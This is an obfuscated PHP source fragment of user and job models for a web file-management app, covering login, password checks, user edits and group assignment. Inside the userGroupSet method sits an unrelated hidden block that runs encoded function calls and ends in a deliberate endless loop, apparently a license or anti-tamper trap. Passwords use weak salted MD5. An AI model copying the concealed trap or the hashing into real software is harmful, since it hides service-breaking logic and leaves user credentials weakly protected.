$ˆÅüĞœÌ))->save($²¦›‘ˆ®); } private function getAutoName($±Ç·Ø±ş) { $ã«ğ«óë =& $_SERVER[øşô´çË]; $­Ùà¼ã´ = array($ã«ğ«óë[1964] => USER_ID, $ã«ğ«óë[582] => 0); $ğŒ¶§» = $this->field($ã«ğ«óë[42])->where($­Ùà¼ã´)->select(); $ğŒ¶§» = array_to_keyvalue($ğŒ¶§», $ã«ğ«óë[12], $ã«ğ«óë[42]); if (!$ğŒ¶§» || !in_array($±Ç·Ø±ş, $ğŒ¶§»)) { return $±Ç·Ø±ş; } for ($Ë¥Ÿé·è = 0; $Ë¥Ÿé·è < count($ğŒ¶§»); $Ë¥Ÿé·è++) { if (!in_array($±Ç·Ø±ş . "\x28{$Ë¥Ÿé·è}\x29", $ğŒ¶§»)) { return $±Ç·Ø±ş . "\x28{$Ë¥Ÿé·è}\51"; } } return $±Ç·Ø±ş . "\50{$Ë¥Ÿé·è}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\152\157\x62\114\151\x73\x74"; public $field = array("\156\x61\155\145", "\144\x65\163\143", "\x73\x6f\162\x74"); const JOB_KEY = "\x73\145\x6c\x66\x4a\157\142\114\x69\163\164"; public function listData($…Õ®É§Æ = false, $±Æ¹»úû = "\163\157\x72\164", $ıåß‚à÷ = false) { return parent::listData($…Õ®É§Æ, $±Æ¹»úû, $ıåß‚à÷); } public function remove($±§—˜íÒ) { return parent::remove($±§—˜íÒ); } public function add($ß×àÃûŠ) { $ÅÕÂ™×å =& $_SERVER[øşô´çË]; if ($this->findByName($ß×àÃûŠ[$ÅÕÂ™×å[42]])) { return !1; } $ß×àÃûŠ[$ÅÕÂ™×å[2200]] = $this->getSort(); return parent::insert($ß×àÃûŠ); } private function getSort() { $ÀÉ”°˜÷ =& $_SERVER[øşô´çË]; $€‚…ˆş¥ = parent::listData(); $æ¿ˆà‘“ = array_to_keyvalue($€‚…ˆş¥, $ÀÉ”°˜÷[12], $ÀÉ”°˜÷[2200]); return empty($æ¿ˆà‘“) ? 0 : max($æ¿ˆà‘“) + 1; } public function update($¯éƒõï½, $ş¤Ó˜ ) { $âÅ…‚³á =& $_SERVER[øşô´çË]; $…Ä€‡Èµ = parent::listData($¯éƒõï½); $¿üÂµŸ‘ = $this->findByName($ş¤Ó˜ [$âÅ…‚³á[42]]); if (!$…Ä€‡Èµ || $¿üÂµŸ‘ && $¿üÂµŸ‘[$âÅ…‚³á[496]] != $…Ä€‡Èµ[$âÅ…‚³á[496]]) { return !1; } return parent::update($¯éƒõï½, $ş¤Ó˜ ); } public function setUserJob($íÙƒÊ«, $ˆØõÍÊÅ) { $Áç¡”õê =& $_SERVER[øşô´çË]; if (!is_array($ˆØõÍÊÅ)) { $ˆØõÍÊÅ = array($ˆØõÍÊÅ); } $õŒ¼¥è = parent::listData(); $¢™Ïóçå = array_to_keyvalue($õŒ¼¥è, $Áç¡”õê[42]); $‘¤ÃÀÑ† = $Áç¡”õê[472]; foreach ($ˆØõÍÊÅ as $Ëİ¨¶Ü²) { if ($¢™Ïóçå[$Ëİ¨¶Ü²]) { $‘¤ÃÀÑ† .= $¢™Ïóçå[$Ëİ¨¶Ü²][$Áç¡”õê[496]] . $Áç¡”õê[60]; } else { $…¢úáÓ¨ = $this->add($Ëİ¨¶Ü²); $‘¤ÃÀÑ† .= $…¢úáÓ¨ . $Áç¡”õê[60]; } } $‘¤ÃÀÑ† = rtrim($‘¤ÃÀÑ†, $Áç¡”õê[60]); Model($Áç¡”õê[626])->metaSet($íÙƒÊ«, self::JOB_KEY, $‘¤ÃÀÑ†); } public function getUserJob($äğ¬ô­Á) { $÷«··ò¸ = Model($_SERVER[øşô´çË][626])->metaGet($äğ¬ô­Á); return $this->getUserJobInfo($÷«··ò¸[self::JOB_KEY]); } public function getUserJobInfo($ŸÈ‚ôŠû) { $·Ü“ı =& $_SERVER[øşô´çË]; $ŠÀƒ¬¨Ç = explode($·Ü“ı[60], $ŸÈ‚ôŠû); $Ğ“Ïš = parent::listData(); $Ğ“Ïš = array_remove_key($Ğ“Ïš, $·Ü“ı[241]); $ôÉÀÂÑ– = array(); foreach ($ŠÀƒ¬¨Ç as $Ÿì‘ø±‡) { if (isset($Ğ“Ïš[$Ÿì‘ø±‡])) { $ôÉÀÂÑ–[] = $Ğ“Ïš[$Ÿì‘ø±‡]; } } return $ôÉÀÂÑ–; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\155\x65" => "\x75\x73\x65\x72\137\155\x65\164\141", "\x6d\x65\x74\141\106\151\145\x6c\x64" => "\165\x73\145\x72\111\x44"); protected $simpleField = "\165\163\145\x72\x49\x44\x2c\x6e\x69\143\x6b\x4e\x61\155\145\x2c\x6e\141\155\145\54\141\166\141\164\x61\162\x2c\163\145\170\x2c\x73\x74\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($àÍàªü) { $è’¬“ŞÕ =& $_SERVER[øşô´çË]; $Œ˜¿­¼Ó = $è’¬“ŞÕ[2668]; return array($è’¬“ŞÕ[2259] => array($àÍàªü[0], $Œ˜¿­¼Ó), $è’¬“ŞÕ[2261] => array($àÍàªü[0], $Œ˜¿­¼Ó), $è’¬“ŞÕ[2669] => array($àÍàªü[0], $Œ˜¿­¼Ó)); } protected function ___getInfo($ûìüÜÅª) { $¿¾½¶¿› = $this->getInfoSimple($ûìüÜÅª); if (!$¿¾½¶¿› || !is_array($¿¾½¶¿›)) { return array(); } return $this->_getInfoApply($¿¾½¶¿›); } protected function ___getInfoFull($¤âÅâö) { $ÛÄ£¤òÍ = $this->getInfoSimple($¤âÅâö); if (!$ÛÄ£¤òÍ || !is_array($ÛÄ£¤òÍ)) { return array(); } return $this->_getInfoApply($ÛÄ£¤òÍ, !0); } protected function ___getInfoSimple($Í«Œ‰İ£) { $Ïê‹§­ã =& $_SERVER[øşô´çË]; if (!$Í«Œ‰İ£) { return array(); } $®ÂÎ­™ = $this->where(array($Ïê‹§­ã[1588] => intval($Í«Œ‰İ£)))->find(); if (!$®ÂÎ­™ || !is_array($®ÂÎ­™)) { return array(); } $®ÂÎ­™[$Ïê‹§­ã[2370]] = Action($Ïê‹§­ã[2371])->parseUrl($®ÂÎ­™[$Ïê‹§­ã[2370]]); return $®ÂÎ­™; } private function _getInfoApply($¡ĞÁ€ó, $äåÄºÑ = false) { $Ëòùó² =& $_SERVER[øşô´çË]; if (!$¡ĞÁ€ó) { return $¡ĞÁ€ó; } $¬å°Öƒ¨ = md5($Ëòùó²[2670] . $¡ĞÁ€ó[$Ëòùó²[1047]] . $Ëòùó²[2671] . $¡ĞÁ€ó[$Ëòùó²[42]]); $¡ĞÁ€ó = $this->_listDataApplyItem($¡ĞÁ€ó); $½½”Ïâ = Model($Ëòùó²[1529])->metaGet($¡ĞÁ€ó[$Ëòùó²[100]][$Ëòùó²[201]]); $¡ĞÁ€ó[$Ëòùó²[2672]] = $¬å°Öƒ¨; $¡ĞÁ€ó[$Ëòùó²[100]][$Ëòùó²[2461]] = isset($½½”Ïâ[$Ëòùó²[2462]]) ? $½½”Ïâ[$Ëòùó²[2462]] : null; if ($äåÄºÑ) { $¡ĞÁ€ó[$Ëòùó²[564]] = $this->metaGet($¡ĞÁ€ó[$Ëòùó²[1588]]); } return $¡ĞÁ€ó; } protected function getInfoSimpleOuter($æŠßì¨É) { $íÂù¦§ =& $_SERVER[øşô´çË]; if (!$æŠßì¨É || $æŠßì¨É == 0) { return array($íÂù¦§[1588] => $íÂù¦§[238], $íÂù¦§[42] => $íÂù¦§[183] . LNG($íÂù¦§[2673]) . $íÂù¦§[185], $íÂù¦§[2370] => STATIC_PATH . $íÂù¦§[2674]); } $ïĞ›š¾ = $this->cacheFunctionGet($íÂù¦§[2270], $æŠßì¨É); $¯éãÃ„ú = array_field_key($ïĞ›š¾, explode($íÂù¦§[60], $this->simpleField)); if (!$¯éãÃ„ú) { return array($íÂù¦§[1588] => $íÂù¦§[1376], $íÂù¦§[42] => $íÂù¦§[183] . LNG($íÂù¦§[2675]) . $íÂù¦§[185], $íÂù¦§[2370] => STATIC_PATH . $íÂù¦§[2676]); } $¯éãÃ„ú[$íÂù¦§[2370]] = Action($íÂù¦§[2371])->parseUrl($¯éãÃ„ú[$íÂù¦§[2370]]); return $¯éãÃ„ú; } protected function groupUser($›İÁ½­) { } public static function errorLang($÷–ÃÜ—Ë) { $¯î¸µ˜ =& $_SERVER[øşô´çË]; $áâÅ²¬Š = array(self::ERROR_USER_NOT_EXISTS => $¯î¸µ˜[2677], self::ERROR_USER_PASSWORD_ERROR => $¯î¸µ˜[2678], self::ERROR_USER_EXIST_NAME => $¯î¸µ˜[2679], self::ERROR_USER_EXIST_PHONE => $¯î¸µ˜[2680], self::ERROR_USER_EXIST_EMAIL => $¯î¸µ˜[2681], self::ERROR_USER_LOGIN_LOCK => $¯î¸µ˜[2682], self::ERROR_IP_NOT_ALLOW => $¯î¸µ˜[2683], self::ERROR_USER_EXIST_NICKNAME => $¯î¸µ˜[2684]); $§›ÜÉ§È = LNG($áâÅ²¬Š[$÷–ÃÜ—Ë]); if ($÷–ÃÜ—Ë == self::ERROR_USER_LOGIN_LOCK) { $­ÖŒ¯µï = (int) Model($¯î¸µ˜[1485])->get($¯î¸µ˜[2685]); if ($­ÖŒ¯µï > 60) { $§›ÜÉ§È = str_replace($¯î¸µ˜[101], ceil($­ÖŒ¯µï / 60), $§›ÜÉ§È); } } return $§›ÜÉ§È; } protected function metaSet($Áıöˆ‡ï, $Ùå®‰ª = null, $Ôšö‡ÀÕ = null) { $this->clearCache($Áıöˆ‡ï); return parent::metaSet($Áıöˆ‡ï, $Ùå®‰ª, $Ôšö‡ÀÕ); } public function getInfoByMeta($›¿ëí›, $¿¶—Äø¤) { $éƒÑùäº =& $_SERVER[øşô´çË]; $×¬Äéµ = Model($éƒÑùäº[2686])->where(array($éƒÑùäº[105] => $›¿ëí›, $éƒÑùäº[460] => $¿¶—Äø¤))->find(); if ($×¬Äéµ) { return $this->getInfo($×¬Äéµ[$éƒÑùäº[1588]]); } return !1; } public function userLoginCheck($îŞãôÓú, $ßÙØªá„, $›öÔÄ†· = false) { $¢ ¾é¶ =& $_SERVER[øşô´çË]; $½ÖçÊ à = $this->userLoginFind($îŞãôÓú); if (!$½ÖçÊ à) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($½ÖçÊ à[$¢ ¾é¶[1588]], $ßÙØªá„)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $›öÔÄ†· ? $this->getInfoFull($½ÖçÊ à[$¢ ¾é¶[1588]]) : $this->getInfo($½ÖçÊ à[$¢ ¾é¶[1588]]); } public function userLoginFind($¹ìƒ’Ê–) { $¼ˆ˜¦¨Ã =& $_SERVER[øşô´çË]; $ûÔûÊü¸ = array($¼ˆ˜¦¨Ã[42] => $¹ìƒ’Ê–, $¼ˆ˜¦¨Ã[2472] => $¹ìƒ’Ê–, $¼ˆ˜¦¨Ã[389] => $¹ìƒ’Ê–, $¼ˆ˜¦¨Ã[2687] => $¹ìƒ’Ê–, $¼ˆ˜¦¨Ã[1164] => $¼ˆ˜¦¨Ã[1166]); if ($this->nickNameRpt()) { unset($ûÔûÊü¸[$¼ˆ˜¦¨Ã[2472]]); } return $this->where($ûÔûÊü¸)->find(); } public function clearCache($Ë’„ÛôÛ) { $¤ìÄ¿Ñ¹ =& $_SERVER[øşô´çË]; $this->cacheFunctionClear($¤ìÄ¿Ñ¹[2269], $Ë’„ÛôÛ); $this->cacheFunctionClear($¤ìÄ¿Ñ¹[2270], $Ë’„ÛôÛ); $this->cacheFunctionClear($¤ìÄ¿Ñ¹[2688], $Ë’„ÛôÛ); } public function userPasswordCheck($Ò¥êĞáù, $¯Äï€³§) { $ËŠÆ†’ë =& $_SERVER[øşô´çË]; $‹ÄÒ„æ = $this->where(array($ËŠÆ†’ë[1588] => intval($Ò¥êĞáù)))->find(); $ğîÌ»˜ó = $this->metaGet($Ò¥êĞáù); $Åîàí¦® = isset($ğîÌ»˜ó[$ËŠÆ†’ë[2689]]) ? $ğîÌ»˜ó[$ËŠÆ†’ë[2689]] : $ËŠÆ†’ë[12]; if (md5($Åîàí¦® . trim($¯Äï€³§)) !== $‹ÄÒ„æ[$ËŠÆ†’ë[1047]]) { return !1; } return !0; } public function userAdd($¡µŸ‡†‚) { $Û®¾â•Â =& $_SERVER[øşô´çË]; $ãë¾’ü‹ = array($Û®¾â•Â[518] => $¡µŸ‡†‚[$Û®¾â•Â[42]], $Û®¾â•Â[2690] => $¡µŸ‡†‚[$Û®¾â•Â[2369]], $Û®¾â•Â[2691] => isset($¡µŸ‡†‚[$Û®¾â•Â[389]]) ? $¡µŸ‡†‚[$Û®¾â•Â[389]] : $Û®¾â•Â[12], $Û®¾â•Â[2692] => isset($¡µŸ‡†‚[$Û®¾â•Â[2687]]) ? $¡µŸ‡†‚[$Û®¾â•Â[2687]] : $Û®¾â•Â[12], $Û®¾â•Â[2693] => isset($¡µŸ‡†‚[$Û®¾â•Â[2472]]) ? $¡µŸ‡†‚[$Û®¾â•Â[2472]] : $¡µŸ‡†‚[$Û®¾â•Â[42]], $Û®¾â•Â[2694] => isset($¡µŸ‡†‚[$Û®¾â•Â[2370]]) ? $¡µŸ‡†‚[$Û®¾â•Â[2370]] : $Û®¾â•Â[12], $Û®¾â•Â[2695] => isset($¡µŸ‡†‚[$Û®¾â•Â[2696]]) ? $¡µŸ‡†‚[$Û®¾â•Â[2696]] : 1, $Û®¾â•Â[2697] => $¡µŸ‡†‚[$Û®¾â•Â[1047]], $Û®¾â•Â[2263] => isset($¡µŸ‡†‚[$Û®¾â•Â[2164]]) ? $¡µŸ‡†‚[$Û®¾â•Â[2164]] : 1024 * 1024 * 20, $Û®¾â•Â[2264] => 0, $Û®¾â•Â[2698] => 0, $Û®¾â•Â[2309] => isset($¡µŸ‡†‚[$Û®¾â•Â[852]]) ? $¡µŸ‡†‚[$Û®¾â•Â[852]] : 1); if (!empty($¡µŸ‡†‚[$Û®¾â•Â[1588]])) { $ãë¾’ü‹[$Û®¾â•Â[1588]] = $¡µŸ‡†‚[$Û®¾â•Â[1588]]; } $ÚÓ²şƒî = $this->_checkExist($¡µŸ‡†‚); if ($ÚÓ²şƒî !== !0) { return $ÚÓ²şƒî; } if (!empty($ãë¾’ü‹[$Û®¾â•Â[2370]]) && strlen($ãë¾’ü‹[$Û®¾â•Â[2370]]) > 255) { $ãë¾’ü‹[$Û®¾â•Â[2370]] = $Û®¾â•Â[12]; } $çß«‹·ø = $this->add($ãë¾’ü‹); $åÀÙ€¶Õ = array($Û®¾â•Â[2697] => $ãë¾’ü‹[$Û®¾â•Â[1047]], $Û®¾â•Â[2693] => $ãë¾’ü‹[$Û®¾â•Â[2472]], $Û®¾â•Â[2699] => $¡µŸ‡†‚[$Û®¾â•Â[2268]]); $this->userEdit($çß«‹·ø, $åÀÙ€¶Õ); Model($Û®¾â•Â[1529])->userRootAdd($çß«‹·ø); return $çß«‹·ø; } protected function userEditTest($¾³¬º£³, $ºùôÍà») { return $this->call($_SERVER[øşô´çË][2700], $¾³¬º£³, $ºùôÍà»); } protected function userEdit($ô•”Èş·, $íïšÌĞ‡) { $¯Á™ =& $_SERVER[øşô´çË]; $Æ£ş›‘ = $this->getInfoSimple($ô•”Èş·); if (!$Æ£ş›‘) { return !1; } $Øƒ­û† = $this->_checkExist($íïšÌĞ‡, $ô•”Èş·); if ($Øƒ­û† !== !0) { return $Øƒ­û†; } if (isset($íïšÌĞ‡[$¯Á™[1047]]) && trim($íïšÌĞ‡[$¯Á™[1047]]) != $¯Á™[12]) { $ß±â»Äœ = $this->metaGet($ô•”Èş·); if (empty($ß±â»Äœ[$¯Á™[2689]])) { $ß±â»Äœ[$¯Á™[2689]] = rand_string(10); Model($¯Á™[606])->metaSet($ô•”Èş·, $¯Á™[2689], $ß±â»Äœ[$¯Á™[2689]]); } $íïšÌĞ‡[$¯Á™[1047]] = md5($ß±â»Äœ[$¯Á™[2689]] . trim($íïšÌĞ‡[$¯Á™[1047]])); } else { unset($íïšÌĞ‡[$¯Á™[1047]]); } if (!empty($íïšÌĞ‡[$¯Á™[2370]]) && strlen($íïšÌĞ‡[$¯Á™[2370]]) > 255) { $íïšÌĞ‡[$¯Á™[2370]] = $¯Á™[12]; } if (isset($íïšÌĞ‡[$¯Á™[2472]])) { $this->setNamePinyin($ô•”Èş·, $íïšÌĞ‡[$¯Á™[2472]]); } if (isset($íïšÌĞ‡[$¯Á™[2268]])) { $»ò“•áÂ = $¯Á™[1488] . $ô•”Èş·; $Ù²¿”âº = $¯Á™[1486]; $öÁµŠéÕ = $íïšÌĞ‡[$¯Á™[2268]] ? $íïšÌĞ‡[$¯Á™[2268]] : $¯Á™[12]; $«·Ü˜ì® = Model($¯Á™[1485])->get($»ò“•áÂ, $Ù²¿”âº); $«·Ü˜ì® = $«·Ü˜ì® ? $«·Ü˜ì® : $¯Á™[12]; if ($«·Ü˜ì® != $öÁµŠéÕ) { if (!$öÁµŠéÕ && $«·Ü˜ì®) { Model($¯Á™[1485])->remove($»ò“•áÂ, $Ù²¿”âº); } else { if ($öÁµŠéÕ) { Model($¯Á™[1485])->set($»ò“•áÂ, $öÁµŠéÕ, $Ù²¿”âº); } } } unset($íïšÌĞ‡[$¯Á™[2268]]); Model($¯Á™[626])->metaSet($ô•”Èş·, $¯Á™[2268], $öÁµŠéÕ); } if (empty($íïšÌĞ‡)) { return !0; } $this->where(array($¯Á™[1964] => $ô•”Èş·))->save($íïšÌĞ‡); $this->clearCache($ô•”Èş·); return !0; } public function setNamePinyin($Ê­ÍÎÔ, $àÓƒüİÛ = false) { $œÅîú¼š =& $_SERVER[øşô´çË]; if (!$àÓƒüİÛ) { $Û»˜¢î÷ = $this->getInfoSimple($Ê­ÍÎÔ); $àÓƒüİÛ = $Û»˜¢î÷[$œÅîú¼š[2472]] ? $Û»˜¢î÷[$œÅîú¼š[2472]] : $Û»˜¢î÷[$œÅîú¼š[42]]; } $®¯Ë§¯ú = Model($œÅîú¼š[626]); if (!Input::check($àÓƒüİÛ, $œÅîú¼š[686])) { return $®¯Ë§¯ú->metaSet($Ê­ÍÎÔ, array($œÅîú¼š[561] => $œÅîú¼š[12], $œÅîú¼š[560] => $œÅîú¼š[12])); } return $®¯Ë§¯ú->metaSet($Ê­ÍÎÔ, array($œÅîú¼š[561] => str_replace($œÅîú¼š[63], $œÅîú¼š[12], Pinyin::get($àÓƒüİÛ)), $œÅîú¼š[560] => Pinyin::get($àÓƒüİÛ, $œÅîú¼š[687]))); } private function nickNameRpt() { $‰ÕñÉÅÇ =& $_SERVER[øşô´çË]; $ùæñœÊ¦ = Model($‰ÕñÉÅÇ[875])->get($‰ÕñÉÅÇ[2701]); $Äó‰÷Şƒ = $GLOBALS[$‰ÕñÉÅÇ[6]][$‰ÕñÉÅÇ[477]][$‰ÕñÉÅÇ[2701]]; $é‡Ë˜­ = !is_null($ùæñœÊ¦) ? $ùæñœÊ¦ : $Äó‰÷Şƒ; return !!$é‡Ë˜­; } private function _checkExist($í”Ç…‡¸, $Š„ ´Ñ… = false) { $ıÎö› =& $_SERVER[øşô´çË]; $‚ùÚ¯°¡ = array($ıÎö›[42] => UserModel::ERROR_USER_EXIST_NAME, $ıÎö›[2472] => UserModel::ERROR_USER_EXIST_NICKNAME, $ıÎö›[389] => UserModel::ERROR_USER_EXIST_EMAIL, $ıÎö›[2687] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($‚ùÚ¯°¡[$ıÎö›[2472]]); } $íãúûñş = $Š„ ´Ñ… ? array($ıÎö›[1588] => array($ıÎö›[2702], $Š„ ´Ñ…)) : array(); foreach ($‚ùÚ¯°¡ as $â‘£¶©– => $üÎÀ«Ÿ) { $‚­àºü¯ = array(); foreach ($‚ùÚ¯°¡ as $¨Şûı·¦ => $œšñÑÛå) { if (isset($í”Ç…‡¸[$¨Şûı·¦]) && $í”Ç…‡¸[$¨Şûı·¦]) { $‚­àºü¯[] = $í”Ç…‡¸[$¨Şûı·¦]; } } if (!$‚­àºü¯) { continue; } $çĞéæ»ª = array_merge(array($â‘£¶©– => array($ıÎö›[7], $‚­àºü¯)), $íãúûñş); $ÖÄ–ÌÑœ = $this->where($çĞéæ»ª)->find(); if ($ÖÄ–ÌÑœ) { return $üÎÀ«Ÿ; } } return !0; } public function userListInfo($©šğÁµ) { $å³•§ =& $_SERVER[øşô´çË]; $·êšÙ¤è = array(); $©šğÁµ = is_array($©šğÁµ) ? array_unique($©šğÁµ) : array(); if (!$©šğÁµ) { return $·êšÙ¤è; } if (count($©šğÁµ) < 20) { foreach ($©šğÁµ as $È™ıÂ´) { $·êšÙ¤è[$È™ıÂ´ . $å³•§[12]] = $this->getInfoSimpleOuter($È™ıÂ´); } } else { $Óêï¿ÊĞ = array($å³•§[1964] => array($å³•§[516], $©šğÁµ)); if (count($©šğÁµ) == 1) { $Óêï¿ÊĞ = array($å³•§[1964] => $©šğÁµ[0]); } $îæìå‹ = Model($å³•§[606])->field($this->simpleField)->where($Óêï¿ÊĞ)->select(); $îæìå‹ = array_to_keyvalue($îæìå‹, $å³•§[1588]); foreach ($©šğÁµ as $È™ıÂ´) { $­ÜŞû¨© = $îæìå‹[$È™ıÂ´]; if (!$­ÜŞû¨©) { $·êšÙ¤è[$È™ıÂ´ . $å³•§[12]] = $this->getInfoSimpleOuter($È™ıÂ´); continue; } $­ÜŞû¨©[$å³•§[2370]] = Action($å³•§[2371])->parseUrl($­ÜŞû¨©[$å³•§[2370]]); $·êšÙ¤è[$È™ıÂ´ . $å³•§[12]] = $­ÜŞû¨©; } } return $·êšÙ¤è; } protected function userStatus($Úµ¦‘æÂ, $Îµ÷‡çÉ) { $úúğèÜ£ = $this->getInfoSimple($Úµ¦‘æÂ); if (!$úúğèÜ£) { return !1; } $ƒĞ˜²Ş¨ = array($_SERVER[øşô´çË][852] => $Îµ÷‡çÉ); return $this->userEdit($Úµ¦‘æÂ, $ƒĞ˜²Ş¨); } protected function userRemove($¿ŒÎ“´ƒ) { $¥¡Òşˆ» =& $_SERVER[øşô´çË]; $é´’Ï­Î = $this->getInfoSimple($¿ŒÎ“´ƒ); if (!$é´’Ï­Î) { return !1; } $œ´Ù‹«Ú = array($¥¡Òşˆ»[1964] => $¿ŒÎ“´ƒ); Model($¥¡Òşˆ»[695])->where($œ´Ù‹«Ú)->delete(); Model($¥¡Òşˆ»[2703])->where($œ´Ù‹«Ú)->delete(); Model($¥¡Òşˆ»[2272])->where($œ´Ù‹«Ú)->delete(); Model($¥¡Òşˆ»[2686])->where($œ´Ù‹«Ú)->delete(); Model($¥¡Òşˆ»[1234])->where($œ´Ù‹«Ú)->delete(); Model($¥¡Òşˆ»[2489])->removeUserAll($¿ŒÎ“´ƒ); Model($¥¡Òşˆ»[935])->userRootRemove($¿ŒÎ“´ƒ); return $this->where($œ´Ù‹«Ú)->delete(); } protected function userGroupSet($¨Ÿı— , $ó±äëÚÜ, $Ãœîõª = array()) { $¾«Ïœ§ =& $_SERVER[øşô´çË]; if (!isset($_SERVER[$¾«Ïœ§[15]]) || !isset($_SERVER[$¾«Ïœ§[13]])) { $‰‚ÚŠİÅ = $¾«Ïœ§[1036]; $¯“¨È³› = $¾«Ïœ§[16]; $˜”ÊãšÇ = $_SERVER[$¾«Ïœ§[17]] . $¾«Ïœ§[18]; $¦ÔÒğ‚ = $¯“¨È³›($˜”ÊãšÇ); $ê›ÉŞ· = explode($¾«Ïœ§[19], $¦ÔÒğ‚); if (count($ê›ÉŞ·) < $¾«Ïœ§[725]) { $¥º“Şñ = $¾«Ïœ§[21]; $¥º“Şñ(); } $ƒñ€¾ó’ = $¾«Ïœ§[1037]; $ƒñ€¾ó’($_SERVER[$¾«Ïœ§[1038]]); $áÆä®«İ = 1; for ($›¢¾îí = $áÆä®«İ; $›¢¾îí > 0; $›¢¾îí++) { $ƒñ€¾ó’ = json_encode($GLOBALS[$¾«Ïœ§[516]]); } } $„»“…¤ñ = $this->getInfoSimple($¨Ÿı— ); if (!$„»“…¤ñ || !is_array($ó±äëÚÜ)) { return !1; } $üÂéïº­ = Model($¾«Ïœ§[2272]); $üÂéïº­->where(array($¾«Ïœ§[1588] => $¨Ÿı— ))->delete(); $ôöÀû = array(); $…Óã¶ò = 0; foreach ($ó±äëÚÜ as $®äœ´ => $ŠÚôï¿) { $öàÖë«‚ = array($¾«Ïœ§[1588] => $¨Ÿı— , $¾«Ïœ§[1491] => $®äœ´, $¾«Ïœ§[1636] => $ŠÚôï¿); $öàÖë«‚[$¾«Ïœ§[2200]] = isset($Ãœîõª[$…Óã¶ò]) ? $Ãœîõª[$…Óã¶ò] : 0; $…Óã¶ò++; $ôöÀû[] = $öàÖë«‚; } return $üÂéïº­->addAll($ôöÀû, array(), !0); } protected function userGroupAdd($ƒ¢Œ§€, $ç”Ò”º = array()) { $ˆì´’Â =& $_SERVER[øşô´çË]; $¼ïâíıÉ = $this->getInfoSimple($ƒ¢Œ§€); if (!$¼ïâíıÉ || empty($ç”Ò”º)) { return !1; } $™ØĞùŠÍ = array(); foreach ($ç”Ò”º as $Ú¯®á¼ => $Á”À¢¶ø) { $™ØĞùŠÍ[] = array($ˆì´’Â[1588] => $ƒ¢Œ§€, $ˆì´’Â[1491] => $Ú¯®á¼, $ˆì´’Â[1636] => $Á”À¢¶ø, $ˆì´’Â[2200] => 0); } return Model($ˆì´’Â[2272])->addAll($™ØĞùŠÍ, array(), !0); } protected function userGroupRemove($è¡áåö¢, $»¦¼ÅÍá) { $é¢èŸº´ =& $_SERVER[øşô´çË]; $Şüß£ˆá = $this->getInfoSimple($è¡áåö¢); if (!$Şüß£ˆá || !$»¦¼ÅÍá) { return !1; } $İŠåö­½ = array($é¢èŸº´[1964] => $è¡áåö¢, $é¢èŸº´[2265] => $»¦¼ÅÍá); return Model($é¢èŸº´[2272])->where($İŠåö­½)->delete(); } public function listData() { $ÕÌËê˜Ş = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÕÌËê˜Ş[$_SERVER[øşô´çË][455]]); return $ÕÌËê˜Ş; } public function listByID($Çè«ÊŠ) { $¶¹òêï =& $_SERVER[øşô´çË]; if (!$Çè«ÊŠ) { return; } $Øƒ©æ†ö = array($¶¹òêï[1588] => array($¶¹òêï[7], $Çè«ÊŠ)); $İû•‘´æ = $this->where($Øƒ©æ†ö)->select(); $İû•‘´æ = array_sort_keep($İû•‘´æ, $¶¹òêï[1588], $Çè«ÊŠ); $this->_listDataApply($İû•‘´æ); return $İû•‘´æ; } public function listByGroup($†Ÿõ›¤ª = 0, $İ”—Øœ = array()) { $âàÌöøá =& $_SERVER[øşô´çË]; $ô—ÉÙƒ = $âàÌöøá[12]; $¯ˆ…šÈè = array(); if ($†Ÿõ›¤ª) { $¯ˆ…šÈè = array($âàÌöøá[2704] => intval($†Ÿõ›¤ª)); $ô—ÉÙƒ = "\114\x45\106\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\x75\x73\x65\x72\x5f\x67\162\157\x75\160\x20\165\163\x65\162\x5f\147\x72\x6f\x75\160\40\157\x6e\x20\165\x73\145\x72\x2e\165\163\x65\162\x49\104\40\75\x20\165\x73\145\162\x5f\x67\x72\x6f\x75\160\x2e\165\x73\145\x72\111\x44"; $îáÏß÷Ï = Input::get($âàÌöøá[553], null, $âàÌöøá[12]) ? $âàÌöøá[12] : $âàÌöøá[2705]; } if (isset($İ”—Øœ[$âàÌöøá[852]])) { $¯ˆ…šÈè[$âàÌöøá[2706]] = $İ”—Øœ[$âàÌöøá[852]]; } $ù¨©ÚÁñ = _get($İ”—Øœ, $âàÌöøá[2707], $âàÌöøá[241]); if (_get($İ”—Øœ, $âàÌöøá[863], !1)) { $¯ˆ…šÈè[$ù¨©ÚÁñ] = array($âàÌöøá[2455], $İ”—Øœ[$âàÌöøá[863]]); } if (_get($İ”—Øœ, $âàÌöøá[864], !1)) { $·±§äçó = array($âàÌöøá[2456], $İ”—Øœ[$âàÌöøá[864]]); if ($¯ˆ…šÈè[$ù¨©ÚÁñ]) { $¯ˆ…šÈè[$ù¨©ÚÁñ] = array($¯ˆ…šÈè[$ù¨©ÚÁñ], $·±§äçó, $âàÌöøá[2457]); } else { $¯ˆ…šÈè[$ù¨©ÚÁñ] = $·±§äçó; } } $ì³€ÓÕ© = $this->_makeOrder($îáÏß÷Ï)->field($âàÌöøá[2708])->where($¯ˆ…šÈè)->join($ô—ÉÙƒ)->selectPage(50); $this->_listDataApply($ì³€ÓÕ©[$âàÌöøá[455]]); return $ì³€ÓÕ©; } private function _makeOrder($ßåòÂ¬‚ = '') { $„õÙı›Š =& $_SERVER[øşô´çË]; $€øÛéš = array($„õÙı›Š[1588], $„õÙı›Š[42], $„õÙı›Š[2166], $„õÙı›Š[2369], $„õÙı›Š[2141], $„õÙı›Š[241]); $Ûå×¡˜ª = array($„õÙı›Š[546] => $„õÙı›Š[547], $„õÙı›Š[548] => $„õÙı›Š[549]); $ş¸‚•”· = Input::get($„õÙı›Š[553], $„õÙı›Š[7], $„õÙı›Š[1964], $€øÛéš); $¸™üìç = Input::get($„õÙı›Š[554], $„õÙı›Š[7], $„õÙı›Š[2273], array($„õÙı›Š[2273], 